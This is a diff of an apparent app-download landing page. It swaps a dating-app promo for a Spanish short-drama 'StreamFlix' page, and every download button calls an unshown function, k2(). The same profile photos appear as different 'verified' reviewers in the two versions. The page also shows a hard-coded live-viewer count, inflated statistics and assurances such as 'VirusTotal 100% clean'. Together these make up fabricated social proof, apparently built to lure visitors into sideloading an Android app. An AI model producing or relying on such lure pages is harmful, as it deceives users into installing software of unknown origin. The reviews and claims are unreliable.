-
-  </div>
-</section>
-
-<section class="sec sec-dark">
-  <h2 class="sec-title">How It Works?</h2>
-  <div class="steps">
-    <div class="step"><div class="step-num">1</div><h5>Download</h5><p>Download without registering</p></div>
-    <div class="step"><div class="step-num">2</div><h5>Explore</h5><p>Find someone you like</p></div>
-    <div class="step"><div class="step-num">3</div><h5>Meet Tonight</h5><p>Chat, meet and have fun</p></div>
-  </div>
-</section>
-
-
-<section class="sec">
-  <h2 class="sec-title">Safe and Private</h2>
-  <div class="safety-grid">
-    <div class="safety-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#32c896" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><div style="font-weight:600;margin:2px 0">Privacy</div><div style="font-size:0.55rem;color:rgba(255,255,255,0.35)">Your identity is protected</div></div>
-    <div class="safety-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ffb432" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M9 12l2 2 4-4"/></svg><div style="font-weight:600;margin:2px 0">Verified</div><div style="font-size:0.55rem;color:rgba(255,255,255,0.35)">All profiles reviewed</div></div>
-    <div class="safety-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#4da6ff" stroke-width="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg><div style="font-weight:600;margin:2px 0">Support</div><div style="font-size:0.55rem;color:rgba(255,255,255,0.35)">Help when you need it</div></div>
-  </div>
-</section>
- <a href="javascript:void(0)" class="dl-btn" onclick="k2()">Download for Android<small>4.8 Stars · 5M+ Downloads · Free</small></a>
-<section class="sec sec-dark">
-  <h2 class="sec-title">What They Say</h2>
-  <p class="sec-sub">Real stories from people who found their match</p>
-  <div class="review-carousel" id="reviewCarousel">
-    <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"I met an amazing girl here last Friday. We chatted, had a few drinks that same night, and the chemistry was instant. Best date in years!"</p><div class="review-author"><img src="img/a/c1.jpg" alt=""><div><div class="review-author-name">Emeka</div><div class="review-author-role">Verified Member</div></div></div></div>
-    <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Everyone here is real and genuine. No fake profiles, no games. I met 3 wonderful women in 2 weeks. Every date was better than the last!"</p><div class="review-author"><img src="img/a/c2.jpg" alt=""><div><div class="review-author-name">Tunde</div><div class="review-author-role">Verified Member</div></div></div></div>
-    <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"At first I was skeptical, but I matched with Blessing and we connected instantly. We had an amazing dinner. I'll see her again this weekend!"</p><div class="review-author"><img src="img/a/c3.jpg" alt=""><div><div class="review-author-name">David</div><div class="review-author-role">Verified Member</div></div></div></div>
-    <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"It's so easy to find someone you truly connect with. You see exactly who you're talking to. No wasted time, just real dates with real people."</p><div class="review-author"><img src="img/a/c4.jpg" alt=""><div><div class="review-author-name">Chuka</div><div class="review-author-role">Verified Member</div></div></div></div>
-    <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"I joined on Thursday and already had a date for Friday night. We went for coffee and talked for hours. Definitely the most natural connection I've had."</p><div class="review-author"><img src="img/a/c5.jpg" alt=""><div><div class="review-author-name">Femi</div><div class="review-author-role">Verified Member</div></div></div></div>
-   </div> 
-</section>
-
-  <section class="sec" style="text-align:center">
-  <h3 style="font-size:1.1rem;font-weight:700;margin-bottom:0.25rem">Ready for <span style="background:linear-gradient(135deg,#ff4b6e,#c44dff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">tonight</span>?</h3>
-  <p style="color:rgba(255,255,255,0.4);font-size:0.7rem;margin-bottom:0.85rem">5M+ have already downloaded. Your night starts here.</p>
-  <a href="javascript:void(0)" class="android-btn" onclick="k2()">Download for Android<small style="display:block;font-size:0.55rem;font-weight:400;opacity:0.6;margin-top:1px">Free</small></a>
-</section>
-
-<!-- Viewer Overlay -->
-<div class="viewer" id="viewer">
-  <button class="viewer-close" onclick="closeViewer()" aria-label="Close">&times;</button>
-  <button class="viewer-arrow prev" onclick="viewerSlide(-1)" aria-label="Previous"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg></button>
-  <button class="viewer-arrow next" onclick="viewerSlide(1)" aria-label="Next"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg></button>
-  <div class="viewer-carousel" id="viewerCarousel" onscroll="updateViewerDots()"></div>
-  <div class="viewer-dots" id="viewerDots"></div>
-  <div class="viewer-info" id="viewerInfo"></div>
+  <div class="close" onclick="dismissToast()">&#10005;</div>
 </div>
 
-<div class="float-cta">
-  <a href="javascript:void(0)" class="float-cta-btn" onclick="k2()">Free Download</a>
+<!-- ============================================================
+     TOP NAV
+     ============================================================ -->
+<nav class="top-nav" id="topNav">
+  <div class="container top-nav-inner">
+    <a class="nav-brand" href="#top">
+      <img class="nav-logo" src="img/logo.jpg" alt="StreamFlix logo">
+      <span class="nav-wordmark">Stream<span>Flix</span></span>
+    </a>
+    <div class="nav-links">
+      <a href="#trending">Tendencias</a>
+      <a href="#features">Funciones</a>
+      <a href="#reviews">Reseñas</a>
+      <a href="#faq">FAQ</a>
+    </div>
+    <button class="btn btn-primary btn-sm" onclick="k2()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      Descargar
+    </button>
+  </div>
+</nav>
+
+<main id="top">
+
+<!-- ============================================================
+     HERO
+     ============================================================ -->
+<section class="hero">
+  <div class="container hero-grid">
+    <div class="reveal">
+      <div class="eyebrow"><span class="dot"></span> #1 App de Series Cortas · 2026</div>
+      <h1>Dramas cortos, <em>emociones grandes</em></h1>
+      <p class="hero-lead">Miles de series cortas verticales. Mira 1 episodio en 60 segundos. Descarga y ve sin conexión. Nuevos dramas cada día. Sin anuncios.</p>
+      <div class="hero-actions">
+        <button class="btn btn-primary" onclick="k2()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          Descargar Gratis — Ver Ahora
+        </button>
+        <span class="micro">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+          Seguro y verificado
+        </span>
+      </div>
+      <div class="hero-meta">
+        <div class="live-indicator">
+          <span class="live-dot"></span>
+          <span><strong class="live-count" id="liveCount">2,847</strong> personas están viendo ahora</span>
+        </div>
+        <div class="avatar-stack">
+          <div class="faces">
+            <img src="img/a/c1.jpg" alt="usuario">
+            <img src="img/a/c2.jpg" alt="usuario">
+            <img src="img/a/c3.jpg" alt="usuario">
+            <img src="img/a/c4.jpg" alt="usuario">
+            <img src="img/a/c5.jpg" alt="usuario">
+          </div>
+          <div class="faces-txt"><strong>50M+</strong> usuarios ya descargaron la app</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="hero-collage reveal d2">
+      <div class="phone phone-2"><img src="img/2a.png" alt="StreamFlix pantalla"></div>
+      <div class="phone"><img src="img/1a.png" alt="StreamFlix app"></div>
+      <div class="poster-float pf-1"><img src="img/1.jpg" alt="De Repente CASADOS"></div>
+      <div class="poster-float pf-2"><img src="img/2.jpg" alt="Sr. DENVER"></div>
+      <div class="float-chip fc-rating"><span class="star">&#9733;</span> 4.8 · 50M+</div>
+      <div class="float-chip fc-downloads">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        Descarga gratis
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     STAT BAND
+     ============================================================ -->
+<div class="stat-band">
+  <div class="container stat-band-inner reveal">
+    <div class="cell"><div class="num">50M+</div><div class="lbl">Descargas</div></div>
+    <div class="cell"><div class="num">4.8&#9733;</div><div class="lbl">Puntuación media</div></div>
+    <div class="cell"><div class="num">10K+</div><div class="lbl">Series disponibles</div></div>
+    <div class="cell"><div class="num">1 min</div><div class="lbl">Por episodio</div></div>
+  </div>
+</div>
+
+<!-- ============================================================
+     TRENDING
+     ============================================================ -->
+<section class="section" id="trending">
+  <div class="container">
+    <div class="section-head reveal">
+      <div class="kicker">Tendencias</div>
+      <h2>Lo que todos <em>están viendo</em></h2>
+      <p class="sub">Series cortas más populares. Nuevas cada día.</p>
+    </div>
+
+    <div class="shelf reveal">
+      <div class="poster" onclick="k2()">
+        <span class="poster-rank">1</span>
+        <span class="poster-badge">Romance</span>
+        <div class="poster-info">
+          <div class="poster-title">De Repente CASADOS</div>
+          <div class="poster-meta"><span class="star">&#9733;</span> 4.9 · 2026</div>
+        </div>
+        <img src="img/1.jpg" alt="De Repente CASADOS" loading="lazy">
+      </div>
+      <div class="poster" onclick="k2()">
+        <span class="poster-rank">2</span>
+        <span class="poster-badge">Éxito</span>
+        <div class="poster-info">
+          <div class="poster-title">Sr. DENVER</div>
+          <div class="poster-meta"><span class="star">&#9733;</span> 4.8 · 2026</div>
+        </div>
+        <img src="img/2.jpg" alt="Sr. DENVER" loading="lazy">
+      </div>
+      <div class="poster" onclick="k2()">
+        <span class="poster-rank">3</span>
+        <span class="poster-badge">Top</span>
+        <div class="poster-info">
+          <div class="poster-title">Swapped Heiress</div>
+          <div class="poster-meta"><span class="star">&#9733;</span> 4.7 · 2026</div>
+        </div>
+        <img src="img/3.jpg" alt="Swapped Heiress" loading="lazy">
+      </div>
+      <div class="poster" onclick="k2()">
+        <span class="poster-rank">4</span>
+        <span class="poster-badge">Drama</span>
+        <div class="poster-info">
+          <div class="poster-title">Matrimonio al Rojo Vivo</div>
+          <div class="poster-meta"><span class="star">&#9733;</span> 4.7 · 2026</div>
+        </div>
+        <img src="img/4.jpg" alt="Matrimonio al Rojo Vivo" loading="lazy">
+      </div>
+      <div class="poster" onclick="k2()">
+        <span class="poster-rank">5</span>
+        <span class="poster-badge">Venganza</span>
+        <div class="poster-info">
+          <div class="poster-title">Estrella de Fútbol</div>
+          <div class="poster-meta"><span class="star">&#9733;</span> 4.6 · 2026</div>
+        </div>
+        <img src="img/5.jpg" alt="Estrella de Fútbol" loading="lazy">
+      </div>
+    </div>
+
+    <!-- marquee -->
+    <div class="marquee reveal">
+      <div class="marquee-track" id="marqueeTrack"></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     FEATURES
+     ============================================================ -->
+<section class="section" id="features">
+  <div class="container">
+    <div class="section-head reveal">
+      <div class="kicker">Por Qué Elegirnos</div>
+      <h2>Todo lo que <em>diversión sin límites</em></h2>
+    </div>
+
+    <div class="bento">
+      <div class="feature f-lg reveal">
+        <span class="num-tag">01</span>
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="4"/><polygon points="10 8 16 12 10 16 10 8" fill="currentColor" stroke="none"/></svg></div>
+        <h3>Episodios de 1 Min</h3>
+        <p>Cada episodio solo 60 segundos. Perfecto para cualquier momento libre.</p>
+      </div>
+      <div class="feature f-sm reveal d1">
+        <span class="num-tag">02</span>
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div>
+        <h3>Modo Sin Conexión</h3>
+        <p>Descarga y ve sin conexión. Donde quieras, sin gastar datos.</p>
+      </div>
+      <div class="feature f-sm reveal d2">
+        <span class="num-tag">03</span>
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
+        <h3>Formato Vertical</h3>
+        <p>Diseñado para tu móvil. Mira con una mano, sin girar la pantalla.</p>
+      </div>
+      <div class="feature f-lg reveal d3">
+        <span class="num-tag">04</span>
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
+        <h3>Nuevos Estrenos Diarios</h3>
+        <p>Series nuevas cada día. Romance, drama, comedia — siempre hay algo fresco.</p>
+      </div>
+
+      <div class="feature-media reveal">
+        <img src="img/s5.png" alt="StreamFlix biblioteca" loading="lazy">
+        <div class="overlay">
+          <h3>&#9889; Todo para tu serie corta</h3>
+          <ul>
+            <li><span class="dot"></span><span><strong>Actualización Diaria</strong> — nuevas series y episodios cada 24 horas</span></li>
+            <li><span class="dot"></span><span><strong>Recomendaciones IA</strong> — el algoritmo aprende lo que te gusta</span></li>
+            <li><span class="dot"></span><span><strong>Géneros Ilimitados</strong> — romance, drama, acción, suspense y más</span></li>
+            <li><span class="dot"></span><span><strong>Subtítulos IA</strong> — traducción en tiempo real en más de 40 idiomas</span></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     REVIEWS
+     ============================================================ -->
+<section class="section" id="reviews" style="background:var(--bg-deep)">
+  <div class="container">
+    <div class="section-head reveal">
+      <div class="kicker">Amado por Millones</div>
+      <h2>No creas solo <em>nuestra palabra</em></h2>
+    </div>
+
+    <div class="reviews reveal">
+      <div class="review">
+        <div class="stars">
+          <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p>"Por fin una app de series cortas que cumple. Los episodios de 1 minuto son perfectos para mis descansos. Ya no uso otras apps."</p>
+        <div class="who"><img src="img/a/c1.jpg" alt="Sarah"><div><div class="name">S***h M.</div><div class="tag">Usuario Verificado</div></div></div>
+      </div>
+      <div class="review">
+        <div class="stars">
+          <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p>"Soy adicta a estas series. El formato vertical es súper cómodo y las recomendaciones siempre aciertan con lo que quiero ver."</p>
+        <div class="who"><img src="img/a/c2.jpg" alt="James"><div><div class="name">J***s R.</div><div class="tag">Usuario Verificado</div></div></div>
+      </div>
+      <div class="review">
+        <div class="stars">
+          <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p>"Descargo capítulos antes de salir y los veo en el metro sin gastar datos. La mejor app para momentos libres."</p>
+        <div class="who"><img src="img/a/c3.jpg" alt="Emily"><div><div class="name">E***y C.</div><div class="tag">Usuario Verificado</div></div></div>
+      </div>
+      <div class="review">
+        <div class="stars">
+          <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p>"La mejor app de series cortas que he probado. Los subtítulos en tiempo real son increíbles y siempre encuentro algo nuevo que ver cada día."</p>
+        <div class="who"><img src="img/a/c4.jpg" alt="Diego"><div><div class="name">D***o M.</div><div class="tag">Usuario Verificado</div></div></div>
+      </div>
+    </div>
+
+    <!-- big stats -->
+    <div class="big-stats reveal">
+      <div class="big-stats-inner">
+        <div class="cell"><div class="num">50M+</div><div class="lbl">Descargas Totales</div></div>
+        <div class="cell"><div class="num">4.8&#9733;</div><div class="lbl">Puntuación Media</div></div>
+        <div class="cell"><div class="num">190</div><div class="lbl">Países Disponibles</div></div>
+        <div class="cell"><div class="num">99.9%</div><div class="lbl">Series Disponibles</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     SECURITY
+     ============================================================ -->
+<section class="section">
+  <div class="container">
+    <div class="section-head reveal">
+      <div class="kicker">Seguro y Verificado</div>
+      <h2>Tu seguridad es <em>nuestra prioridad</em></h2>
+      <p class="sub">Cada versión es analizada, firmada y verificada antes de llegar a ti.</p>
+    </div>
+
+    <div class="sec-grid reveal">
+      <div class="sec-card">
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg></div>
+        <h3>VirusTotal Analizado</h3>
+        <p>100% limpio · 72 motores aprobados</p>
+      </div>
+      <div class="sec-card">
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/><circle cx="12" cy="16" r="1"/></svg></div>
+        <h3>Firmado SHA-256</h3>
+        <p>Verificado criptográficamente · a prueba de manipulaciones</p>
+      </div>
+      <div class="sec-card">
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+        <h3>Actualización Automática</h3>
+        <p>Recibe la última versión tan pronto como la publicamos</p>
+      </div>
+      <div class="sec-card">
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5"/><circle cx="12" cy="12" r="3"/><path d="M4.93 4.93l1.41 1.41"/><path d="M17.66 17.66l1.41 1.41"/></svg></div>
+        <h3>Sin Abuso de Permisos</h3>
+        <p>Solo solicita lo estrictamente necesario</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     DOWNLOAD CTA
+     ============================================================ -->
+<section class="download reveal">
+  <div class="download-inner">
+    <div class="kicker">
